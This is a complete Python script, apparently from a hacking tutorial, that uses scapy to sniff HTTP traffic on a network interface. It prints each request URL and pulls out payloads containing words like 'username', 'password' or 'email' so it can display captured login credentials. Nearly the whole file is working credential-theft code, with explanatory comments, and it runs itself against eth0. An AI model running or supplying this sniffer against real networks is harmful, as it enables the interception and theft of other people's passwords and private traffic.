#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http   # To filter http packets

def sniff_packets(interface):
    scapy.sniff(iface = interface, store = False, prn = process_sniffed_packet) # By making store = False we're asking computer not to store all packets in memory.

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path # Host field contains domain and Path field contains rest of the url.

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # By doing a packet.show() we  got to know that username and password are in a layer called 'RAW'.
        load = packet[scapy.Raw].load  # 'load' field inside 'Raw' layer has username and password.
        keywords = ['username', 'user', 'usr', 'login', 'password', 'pwd', 'pass', 'email']  # That's what programmers might use to define the variable
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):  # only packets which has data of HTTPRequest
        url = get_url(packet)
        print("[+] HTTP Request >> " + url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")  # Only display when it exists

sniff_packets("eth0")
